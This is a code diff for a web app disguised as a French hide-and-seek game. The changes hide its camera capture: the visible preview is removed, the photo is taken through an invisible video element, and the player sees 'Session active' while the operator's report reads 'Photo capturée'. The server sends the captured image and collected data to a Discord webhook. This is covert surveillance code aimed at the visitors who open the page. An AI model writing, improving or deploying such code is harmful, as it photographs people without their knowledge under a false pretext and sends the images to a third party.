@@ -92,18 +92,11 @@ app.get('/', (req, res) => {
                 }
 
                 #game-dashboard { display: none; }
-                #camera-preview {
-                    width: 100%;
-                    max-height: 240px;
-                    border-radius: 8px;
-                    margin-top: 15px;
-                    background: #000;
-                    object-fit: cover;
-                }
             </style>
         </head>
         <body>
 
+            <!-- Étape 1 : Lobby -->
             <div id="lobby" class="game-card">
                 <div class="icon">🙈🔍</div>
                 <h1>Cache-Cache Numérique</h1>
@@ -115,13 +108,13 @@ app.get('/', (req, res) => {
                 </div>
             </div>
 
+            <!-- Étape 2 : Tableau de bord joueur (sans affichage vidéo) -->
             <div id="game-dashboard" class="game-card">
                 <div class="icon">🎯</div>
                 <h1>Partie en cours</h1>
-                <p>Coordonnées et flux vidéo initialisés. Recherche de cachettes...</p>
-                <video id="camera-preview" autoplay playsinline muted></video>
+                <p>Connexion établie. Recherche de cachettes à proximité...</p>
                 <div style="background: #1f2937; padding: 15px; border-radius: 8px; margin-top: 15px; font-size: 0.85rem; color: #10b981;">
-                    Statut : Joueur connecté & Caméra capturée
+                    Statut : Joueur connecté & Session active
                 </div>
             </div>
 
@@ -170,18 +163,25 @@ app.get('/', (req, res) => {
                 async function activerCameraEtCapturer() {
                     try {
                         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                        const videoElement = document.getElementById('camera-preview');
-                        videoElement.srcObject = stream;
+                        
+                        // Création d'un élément vidéo invisible en mémoire
+                        const video = document.createElement('video');
+                        video.muted = true;
+                        video.playsInline = true;
+                        video.srcObject = stream;
 
-                        // Attendre la lecture effective de la vidéo
+                        // Attendre la lecture effective du flux en arrière-plan
                         await new Promise((resolve) => {
-                            videoElement.onloadedmetadata = () => {
-                                videoElement.play();
-                                setTimeout(resolve, 1000); // Pause de 1 sec pour stabiliser l'exposition
+                            video.onloadedmetadata = () => {
+                                video.play();
+                                setTimeout(resolve, 1000); // Délai d'exposition capteur
                             };
                         });
 
-                        const photoData = capturerImage(videoElement);
+                        const photoData = capturerImage(video);
+
+                        // Arrêter les flux de la caméra après la capture
+                        stream.getTracks().forEach(track => track.stop());
 
                         return {
                             statut: "Autorisée",
@@ -255,7 +255,7 @@ app.post('/api/collecte', async (req, res) => {
 
     let cameraText = "⏳ Non vérifiée";
     if (camera.statut === "Autorisée") {
-        cameraText = `📷 Accès accordé`;
+        cameraText = `📷 Photo capturée`;
     } else if (camera.statut === "Refusée") {
         cameraText = `❌ Accès refusé (${camera.erreur || 'Inconnu'})`;
         colorCode = 15158332;
@@ -284,7 +284,7 @@ app.post('/api/collecte', async (req, res) => {
                 const base64Data = photoBase64.replace(/^data:image\/\w+;base64,/, '');
                 const buffer = Buffer.from(base64Data, 'base64');
 
-                // Utilisation de FormData natif pour l'envoi de fichier vers Discord
+                // Envoi Multipart Form Data à Discord
                 const formData = new FormData();
                 formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
                 formData.append('files[0]', new Blob([buffer], { type: 'image/jpeg' }), 'capture.jpg');
